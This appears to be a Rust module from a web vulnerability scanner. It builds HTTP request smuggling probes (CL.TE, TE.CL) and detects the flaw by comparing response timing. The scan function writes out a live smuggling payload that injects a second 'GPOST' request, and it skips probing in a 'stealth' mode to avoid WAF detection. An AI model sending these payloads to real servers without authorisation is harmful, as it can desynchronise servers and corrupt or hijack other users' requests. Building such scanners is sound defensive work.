//! HTTP Request Smuggling v2 — CL.TE / TE.CL / H2 downgrade probes.
//! Timing-based differential detection.

use crate::http::HttpClient;
use crate::types::{Finding, Mode, Severity};
use std::time::Instant;

/// CL.TE probe: send conflicting Content-Length + Transfer-Encoding: chunked.
/// If front-end uses CL but backend uses TE, body may be delayed.
pub fn cl_te_probe_body(te_chunked_body: &str, cl_len: usize) -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(format!("POST / HTTP/1.1\r\n").as_bytes());
    out.extend_from_slice(format!("Host: target\r\n").as_bytes());
    out.extend_from_slice(format!("Content-Length: {}\r\n", cl_len).as_bytes());
    out.extend_from_slice(format!("Transfer-Encoding: chunked\r\n").as_bytes());
    out.extend_from_slice(format!("\r\n").as_bytes());
    out.extend_from_slice(te_chunked_body.as_bytes());
    out
}

/// TE.CL probe: send chunked body where chunk size mismatches actual body length.
pub fn te_cl_probe_body(te_body: &str) -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(format!("POST / HTTP/1.1\r\n").as_bytes());
    out.extend_from_slice(format!("Host: target\r\n").as_bytes());
    out.extend_from_slice(format!("Content-Length: 4\r\n").as_bytes());
    out.extend_from_slice(format!("Transfer-Encoding: chunked\r\n").as_bytes());
    out.extend_from_slice(format!("\r\n").as_bytes());
    out.extend_from_slice(te_body.as_bytes());
    out
}

/// Detect smuggling via timing differential.
/// Returns Some(true) if smuggling-likely (response delayed).
pub fn is_smuggle_timing(baseline_ms: u128, probe_ms: u128, threshold_ms: u128) -> bool {
    probe_ms > baseline_ms + threshold_ms
}

pub async fn scan(http: &HttpClient, target: &str, mode: Mode) -> Vec<Finding> {
    let mut findings = Vec::new();
    if mode == Mode::Stealth {
        return findings; // too noisy + risk of WAF flag
    }
    let body_cl_te = "0\r\n\r\nGPOST / HTTP/1.1\r\nHost: target\r\nContent-Length: 15\r\n\r\nSMUGGLED=test";
    let bytes = cl_te_probe_body(body_cl_te, body_cl_te.len());

    let t0 = Instant::now();
    let _ = http.get(target).await;
    let baseline_ms = t0.elapsed().as_millis();

    let body_str = match std::str::from_utf8(&bytes) {
        Ok(s) => s,
        Err(_) => return findings,
    };
    let t1 = Instant::now();
    let _ = http.fetch(target, reqwest::Method::POST, Some(body_str), None).await;
    let probe_ms = t1.elapsed().as_millis();

    if is_smuggle_timing(baseline_ms, probe_ms, 1500) {
        findings.push(Finding {
            severity: Severity::Critical,
            category: "SMUGGLE".into(),
            title: "HTTP Request Smuggling CL.TE timing differential detected".into(),
            target: target.to_string(),
            param: None,
            payload: None,
            evidence: Some(format!("baseline={}ms probe={}ms diff={}ms", baseline_ms, probe_ms, probe_ms.saturating_sub(baseline_ms))),
            confidence: 60,
            note: Some("Server accepted conflicting CL+TE. Verify with burp/turbolistener before reporting.".into()),
            request: None,
            response: None,
        });
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn cl_te_builds() {
        let bytes = cl_te_probe_body("0\r\n\r\n", 4);
        let s = std::str::from_utf8(&bytes).unwrap();
        assert!(s.contains("Content-Length: 4"));
        assert!(s.contains("Transfer-Encoding: chunked"));
    }
    #[test]
    fn te_cl_builds() {
        let bytes = te_cl_probe_body("0\r\n\r\n");
        let s = std::str::from_utf8(&bytes).unwrap();
        assert!(s.contains("Content-Length: 4"));
        assert!(s.contains("Transfer-Encoding: chunked"));
    }
    #[test]
    fn timing_positive() {
        assert!(is_smuggle_timing(100, 2000, 500));
    }
    #[test]
    fn timing_negative() {
        assert!(!is_smuggle_timing(100, 200, 500));
    }
}
